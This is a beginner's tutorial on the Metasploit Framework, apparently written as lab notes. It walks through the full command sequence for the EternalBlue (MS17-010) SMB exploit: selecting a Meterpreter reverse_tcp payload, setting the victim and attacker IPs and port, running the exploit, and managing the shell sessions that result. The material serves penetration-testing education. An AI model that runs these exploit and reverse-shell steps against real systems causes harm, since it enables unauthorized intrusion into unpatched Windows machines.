# 🔧 What is the Metasploit Framework?
As the name suggests, Metasploit is an exploitation framework used for identifying, exploiting, and managing vulnerabilities on target systems.
----------
## 🧱 Module Types in Metasploit
| Module Type | Description                                                 |
|-------------|-------------------------------------------------------------|
| exploit     | Code that uses a vulnerability to gain access              |
| payload     | Code that runs after a successful exploit, such as a reverse shell |
| auxiliary   | Tools for scanning, brute force, and info gathering (not actual exploits) |
| post        | Actions done after exploitation, like dumping passwords    |
| encoder     | Encodes the payload (used sometimes to evade detection)    |
| nop         | Adds padding (no operation), used for payload stability    |


---

## 🔍 Finding and Using Exploits
You can search, review, and use exploits like this:
-  This exploit is for example (exploit/windows/smb/ms17_010_eternalblue)

```
search eternalblue
```
```
info exploit/windows/smb/ms17_010_eternalblue
```
```
use exploit/windows/smb/ms17_010_eternalblue
```

This exploit targets a known Windows vulnerability: MS17-010 (EternalBlue).


---


##   🎯 Selecting a Payload

### What is Payload?
- A payload is the code that runs after exploiting a vulnerability. It gives you access to the target system

After choosing the exploit, you need to choose what it will execute.
Example: show compatible payloads

```
show payloads

set payload windows/x64/meterpreter/reverse_tcp
```
## ⚙️ Setting Options
Each module and payload has required options. You must configure them:


| Command             | Description                        |
|---------------------|------------------------------------|
| `show options`      | Displays available module options  |
| `set RHOSTS 10.10.xxx.xxx` | Sets the target IP address         |
| `set LHOST 10.10.xxx.xxx` | Sets your local (attacker) IP       |
| `set LPORT 4444`         | Sets the port to listen for reverse shell |


### 🚀 Running the Exploit
Once everything is set, run the exploit:
```
exploit 
```
or
```
run
```
If successful, you will get shell access to the target:
```
[*] Command shell session 1 opened (10.10.xx.xx:4444 -> 10.10.xxx.xxx:49366)
```
### Detailed meaning:⬆️
- Command shell session 1 opened
- This means an active command shell session has been established with the target machine.
- You can now send commands to the remote system.

`(10.10.xx.xx:4444 -> 10.10.xxx.xxx:49366)`
⬆️ This shows the connection between two computers:

`10.10.xx.xx:4444` — your machine’s IP and port where it is listening (the listener).

`10.10.xxx.xxx:49366` — the target machine’s IP and its port used to connect back to your listener.

---
 
## 🧠 Important Terms

| Term    | Meaning                                   |
|---------|-------------------------------------------|
| RHOSTS  | Remote host (the victim IP)                |
| LHOST   | Local host (your machine IP)                |
| LPORT   | Local port (where you'll receive the connection) |
| exploit | The vulnerability being used                |
| payload | What is executed after the exploit succeeds |
| session | An open connection to the compromised target |

---

## 🧪 Example: EternalBlue

| Command                          | Description                                    |
|---------------------------------|------------------------------------------------|
| `use exploit/windows/smb/ms17_010_eternalblue` | Select the EternalBlue exploit module          |
| `set payload windows/x64/meterpreter/reverse_tcp` | Set the payload to a Windows 64-bit Meterpreter reverse TCP shell |
| `set RHOSTS 10.10.12.229`       | Set the target IP address                       |
| `set LHOST 10.10.186.44`        | Set your local IP address (attacker machine)   |
| `set LPORT 4444`                | Set the local port to listen for the connection |
| `exploit`                      | Run the exploit                                |

If the target is vulnerable and the payload connects, you’ll get a shell session.

---

## 🖥️ Managing Sessions
If the exploit succeeds, you can:

| Command         | Action                 |
|-----------------|------------------------|
| `CTRL+Z`        | Background the session  |
| `sessions`      | List active sessions   |
| `sessions -i 1` | Interact with session 1 |
| `sessions -k 1` | Kill session 1         |


You can also rename, upgrade, or run scripts on sessions.
```
sessions -h    # Show session options/help
```

---

## ✅ Summary
To use Metasploit exploits, you need to:

- Find a working exploit and use it

- Choose the correct payload

- Set RHOSTS (victim), LHOST (your IP), and LPORT

- Run the exploit and manage the session

This is the foundation of exploitation. After this, you can move on to:

- Manual payload creation with `msfvenom`ruu

- Post-exploitation tasks

- Custom shell creation


-------



> ## ⚠️ Disclaimer
All commands and procedures shown here work in an ideal test environment. In real-world scenarios, issues may arise due to:

> - Firewall rules

> - Antivirus software

> - Different OS versions

> - Access permissions and restrictions

> - Network configurations

This is the basic principle and guideline for using Metasploit. Real-world use requires adjustments and experimentation.
